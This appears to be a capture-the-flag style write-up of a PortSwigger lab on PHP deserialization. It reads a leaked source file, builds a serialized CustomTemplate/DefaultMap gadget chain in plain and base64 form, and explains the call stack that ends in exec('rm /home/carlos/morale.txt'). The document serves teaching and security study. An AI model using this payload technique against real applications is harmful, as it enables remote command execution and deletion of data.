# [Developing a custom gadget chain for PHP deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization)

- open the lab in burp browser
- log in with `wiener:peter`
- send the `/` request to the repeater (for later)
- in the target -> site map check for the `/cgi-bin/libs/CustomTemplate.php` request
- send it to the repeater and update it with a `~` and send the request

```
GET /cgi-bin/libs/CustomTemplate.php~ HTTP/2
...
```

- it will return a `php` code
- that code will be explained below why it is matter
- go back to the `/` request
- change the token to the following
- `base64` and `url` encode it

```
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
```

- something like this

```
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MTc6ImRlZmF1bHRfZGVzY190eXBlIjtzOjI2OiJybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7czo0OiJkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjg6ImNhbGxiYWNrIjtzOjQ6ImV4ZWMiO319Cg==
```

- send it

## why does it work

> the code

```php
<?php

class CustomTemplate
{
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type = 'HTML_DESC')
    {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep()
    {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup()
    {
        $this->build_product();
    }

    private function build_product()
    {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product
{
    public $desc;

    public function __construct($default_desc_type, $desc)
    {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description
{
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct()
    {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap
{
    private $callback;

    public function __construct($callback)
    {
        $this->callback = $callback;
    }

    public function __get($name)
    {
        return call_user_func($this->callback, $name);
    }
}

?>
```

> the exploit token split into pieces:

```
O:14:"CustomTemplate":2:{
   s:17:"default_desc_type"; s:26:"rm /home/carlos/morale.txt";
   s:4:"desc"; O:10:"DefaultMap":1:{
        s:8:"callback"; s:4:"exec";
   }
}
```

> what the exploit token does piece by piece:

```
┌─ O:14:"CustomTemplate"
│     -> builds a CustomTemplate object
│     -> __wakeup() auto-fires
│
├─ s:26:"rm /home/carlos/morale.txt"   (the default_desc_type value)
│     -> this becomes the COMMAND / argument
│
├─ O:10:"DefaultMap"   (the desc value)
│     -> desc is now a DefaultMap object
│     -> Product reads:  $desc->{"rm /home/carlos/morale.txt"}
│     -> property missing -> __get() fires
│
├─ s:4:"exec"   (the callback value)
│     -> the FUNCTION to run
│
└─ RESULT:  exec("rm /home/carlos/morale.txt")
         -> file deleted
```

> callstack

```
1. deserialize(cookie)
   └─ token: O:14:"CustomTemplate"

2. CustomTemplate::__wakeup()
   └─ (auto-fires after rebuild)

3. CustomTemplate::build_product()
   └─ new Product(default_desc_type, desc)
        ├─ token: s:26:"rm /home/carlos/morale.txt"     -> default_desc_type
        └─ token: O:10:"DefaultMap"                     -> desc

4. Product::__construct()
   └─ $desc->{"rm /home/carlos/morale.txt"}   <- property missing!

5. DefaultMap::__get("rm /home/carlos/morale.txt")
   └─ call_user_func($callback, $name)
        ├─ token: s:4:"exec"                            -> callback
        └─ $name = "rm /home/carlos/morale.txt"

6. exec("rm /home/carlos/morale.txt")
   └─ file deleted
```
